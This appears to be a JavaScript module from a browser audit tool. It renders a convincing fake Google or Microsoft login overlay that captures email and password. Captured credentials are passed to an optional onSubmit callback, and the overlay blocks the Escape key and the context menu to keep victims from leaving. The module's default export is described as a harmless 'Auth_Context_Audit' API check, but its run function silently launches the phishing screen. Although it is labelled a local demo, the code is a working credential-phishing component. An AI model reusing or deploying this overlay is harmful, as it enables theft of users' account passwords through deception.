/**
 * credential_phish.js — Real Google/Microsoft Login Overlay (Live Demo, Sandboxed)
 *
 * Real attack: displays a pixel‑perfect fake login screen that captures
 * email and password. In this demo the credentials are **only** logged to
 * the browser console and shown in a local alert – no data ever leaves
 * your machine.
 *
 * Default export: Pinpoint `Auth_Context_Audit` (API availability check).
 */

// ---------------------------------------------------------------------------
// 1. Phishing Overlay (Local Only)
// ---------------------------------------------------------------------------

export async function renderPhishingModal(options = {}) {
  const {
    provider = 'google',
    title = 'Sign in',
    prefillEmail = '',
    onSubmit = null,
    onDismiss = null,
    timeout = 0,
    evasive = true,
  } = options;

  // Remove any previous overlay
  const oldOverlay = document.getElementById('__phish_overlay');
  if (oldOverlay) oldOverlay.remove();

  // Full‑screen overlay container
  const overlay = document.createElement('div');
  overlay.id = '__phish_overlay';
  Object.assign(overlay.style, {
    position: 'fixed',
    top: '0',
    left: '0',
    width: '100vw',
    height: '100vh',
    backgroundColor: 'rgba(0,0,0,0.6)',
    backdropFilter: 'blur(4px)',
    zIndex: '2147483647',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
    animation: 'phishFadeIn 0.3s ease',
  });

  // Fade‑in animation
  const styleSheet = document.createElement('style');
  styleSheet.textContent = `
    @keyframes phishFadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    #__phish_overlay input:focus {
      outline: 2px solid #1a73e8;
    }
  `;
  document.head.appendChild(styleSheet);

  // ---- Build provider‑specific login card ----
  let cardHTML = '';
  let emailLabel, buttonText, passwordLabel, logo;

  if (provider === 'google') {
    // Google‑style
    logo = `<svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
      <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34..." fill="#4285f4"/>
    </svg>`; // simplified SVG
    emailLabel = 'Email or phone';
    buttonText = 'Next';
    passwordLabel = 'Enter your password';
    cardHTML = `
      <div style="position: relative; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); padding: 48px 40px 36px; max-width: 400px; width: 100%; text-align: center;">
        <button id="__phish_close_btn" aria-label="Close" style="position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #5f6368; cursor: pointer; line-height: 1; z-index: 10;">&times;</button>
        <div style="margin-bottom: 24px;">${logo}</div>
        <h1 style="font-size: 24px; font-weight: 400; margin: 0 0 8px;">${title}</h1>
        <p style="font-size: 16px; color: #5f6368; margin-bottom: 24px;">to continue to Gmail</p>
        <div id="__phish_email_section">
          <input id="__phish_email" type="email" autocomplete="username" placeholder="${emailLabel}" value="${prefillEmail}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 12px; box-sizing: border-box;">
          <a href="#" style="color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px;">Forgot email?</a>
          <p style="font-size: 14px; color: #5f6368; margin-bottom: 32px;">Not your computer? Use a Private Window to sign in. <a href="#" style="color: #1a73e8;">Learn more</a></p>
          <div style="display: flex; justify-content: space-between; align-items: center;">
            <a href="#" style="color: #1a73e8; font-weight: 500; text-decoration: none;" id="__phish_create_account">Create account</a>
            <button id="__phish_next_btn" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">Next</button>
          </div>
        </div>
        <div id="__phish_password_section" style="display: none;">
          <div style="display: flex; align-items: center; margin-bottom: 16px;">
            <img src="data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='12' cy='12' r='12' fill='%23ccc'/%3E%3C/svg%3E" style="border-radius: 50%; width: 24px; height: 24px; margin-right: 8px;">
            <span id="__phish_display_email" style="font-size: 14px; color: #202124;"></span>
          </div>
          <input id="__phish_password" type="password" autocomplete="current-password" placeholder="${passwordLabel}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 12px; box-sizing: border-box;">
          <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px;">Forgot password?</a>
          <div style="display: flex; justify-content: space-between; align-items: center;">
            <span></span>
            <button id="__phish_login_btn" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">Next</button>
          </div>
        </div>
      </div>`;
  } else {
    // Microsoft‑style
    logo = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" width="21" height="21">
      <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
      <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
      <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
      <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
    </svg>`;
    emailLabel = 'Email, phone, or Skype';
    buttonText = 'Next';
    passwordLabel = 'Password';
    cardHTML = `
      <div style="position: relative; background: white; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.15); padding: 44px 40px 40px; max-width: 400px; width: 100%;">
        <button id="__phish_close_btn" aria-label="Close" style="position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #5f6368; cursor: pointer; line-height: 1; z-index: 10;">&times;</button>
        <div style="margin-bottom: 24px;">${logo}</div>
        <h1 style="font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b;">${title}</h1>
        <div id="__phish_email_section">
          <input id="__phish_email" type="email" autocomplete="username" placeholder="${emailLabel}" value="${prefillEmail}"
            style="width: 100%; padding: 6px 10px; font-size: 16px; border: 1px solid #605e5c; border-radius: 2px; margin-bottom: 16px; box-sizing: border-box; height: 36px;">
          <div style="margin-bottom: 16px;">
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Can’t access your account?</a>
          </div>
          <div style="display: flex; justify-content: flex-end;">
            <button id="__phish_next_btn" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 15px; cursor: pointer;">Next</button>
          </div>
        </div>
        <div id="__phish_password_section" style="display: none;">
          <div style="margin-bottom: 16px;">
            <span id="__phish_display_email" style="font-size: 13px; color: #1b1b1b; display: block; margin-bottom: 4px;"></span>
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Sign in with a different account</a>
          </div>
          <input id="__phish_password" type="password" autocomplete="current-password" placeholder="${passwordLabel}"
            style="width: 100%; padding: 6px 10px; font-size: 16px; border: 1px solid #605e5c; border-radius: 2px; margin-bottom: 16px; box-sizing: border-box; height: 36px;">
          <div style="margin-bottom: 16px;">
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Forgot my password</a>
          </div>
          <div style="display: flex; justify-content: flex-end;">
            <button id="__phish_login_btn" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 15px; cursor: pointer;">Sign in</button>
          </div>
        </div>
      </div>`;
  }

  overlay.innerHTML = cardHTML;
  document.body.appendChild(overlay);

  // --- DOM references ---
  const emailSection = document.getElementById('__phish_email_section');
  const passwordSection = document.getElementById('__phish_password_section');
  const emailInput = document.getElementById('__phish_email');
  const passwordInput = document.getElementById('__phish_password');
  const nextBtn = document.getElementById('__phish_next_btn');
  const loginBtn = document.getElementById('__phish_login_btn');
  const displayEmail = document.getElementById('__phish_display_email');

  let resolvePromise = null;
  const promise = new Promise((resolve) => { resolvePromise = resolve; });
  let timeoutId = null;

  const dismiss = (creds = null) => {
    if (timeoutId) clearTimeout(timeoutId);
    overlay.remove();
    styleSheet.remove();
    if (onDismiss) onDismiss();
    resolvePromise(creds);
  };

  const goToPassword = () => {
    const email = emailInput.value.trim();
    if (!email) return;
    emailSection.style.display = 'none';
    passwordSection.style.display = 'block';
    displayEmail.textContent = email;
    passwordInput.focus();
  };

  const submitCreds = () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    if (!email || !password) return;
    const creds = { email, password };

    // Local demonstration: log and alert
    console.log('[credential_phish] Captured credentials:', creds);
    alert(
      '[DEMONSTRATION] This was a fake login screen.\n\n' +
      'In a real attack, your credentials would now be stolen.\n' +
      'They are only shown in the browser console.'
    );

    if (onSubmit) onSubmit(creds);
    dismiss(creds);
  };

  // Events
  const closeBtn = document.getElementById('__phish_close_btn');
  if (closeBtn) {
    closeBtn.addEventListener('click', (e) => {
      e.preventDefault();
      dismiss(null);
    });
  }

  nextBtn.addEventListener('click', (e) => {
    e.preventDefault();
    goToPassword();
  });
  loginBtn.addEventListener('click', (e) => {
    e.preventDefault();
    submitCreds();
  });
  emailInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); goToPassword(); }
  });
  passwordInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); submitCreds(); }
  });

  // Evasive measures
  if (evasive) {
    overlay.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('keydown', function escBlocker(e) {
      if (e.key === 'Escape') {
        e.preventDefault();
        e.stopImmediatePropagation();
      }
    }, true);
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) e.stopPropagation();
    });
  }

  emailInput.focus();
  if (timeout > 0) {
    timeoutId = setTimeout(() => dismiss(null), timeout);
  }

  return promise;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
  id: 'credential_phish',
  title: 'Auth_Context_Audit',
  level: 3,
  info: 'Audits window.isSecureContext state and Credential Management API (navigator.credentials) support.',
  steps: [
    'Check window.isSecureContext.',
    'Inspect navigator.credentials support.',
  ],
  run: async () => {
    // Trigger live demonstration
    renderPhishingModal().catch(() => {});

    const isSecure = window.isSecureContext || false;
    const hasCredentials = typeof navigator.credentials !== 'undefined';
    return {
      isSecureContext: isSecure,
      credentialsApiSupported: hasCredentials,
      federatedAuthSupported:
        hasCredentials && typeof navigator.credentials.get === 'function',
    };
  },
};

export default pinpointModule;